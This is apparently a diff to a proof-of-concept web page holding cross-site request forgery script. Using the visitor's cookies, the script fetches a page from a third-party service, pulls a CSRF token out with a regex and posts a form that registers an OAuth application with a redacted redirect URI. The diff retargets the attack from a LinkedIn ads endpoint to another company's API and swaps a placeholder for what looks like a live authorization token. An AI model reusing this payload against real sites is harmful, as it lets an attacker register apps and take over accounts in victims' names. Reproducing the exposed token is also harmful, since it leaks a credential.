@@ -2,14 +2,14 @@
 	<script>
 		var xhr = new XMLHttpRequest();
 		xhr.onload = handleResponse;
-		xhr.open('get', 'https://px.ads.linkedin.com/wa/', true);
+		xhr.open('get', 'https://api.company-target.com/api/v3/ip.json', true);
 		xhr.withCredentials = true;
 		xhr.send();
 		function handleResponse() {
 			var token = this.responseText.match("name='csrfmiddlewaretoken' value=(.*)? />")[1].trim()
 			var token_stripped = token.substring(0,token.length -1).substring(1)
 			var createApp = new XMLHttpRequest();
-			createApp.open('post', 'https://px.ads.linkedin.com/wa/', true);
+			createApp.open('post', 'https://api.company-target.com/api/v3/ip.json', true);
 			createApp.withCredentials = true;
 			createApp.setRequestHeader("Content-type","application/x-www-form-urlencoded")
             var payload = 'csrfmiddlewaretoken='+token_stripped+'&authorization_grant_type=authorization-code&name=waymobetta&client_type=confidential&redirect_uris=https%3A%2F%2F████'
@@ -43,7 +43,7 @@
             method: "GET",
             credentials: "include", // Include cookies with the request
             headers: {
-                "Authorization": "Bearer YOUR_AUTH_TOKEN", // Include token if needed
+                "Authorization": "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN", // Include token if needed
                 "Content-Type": "application/json"
             }
         })
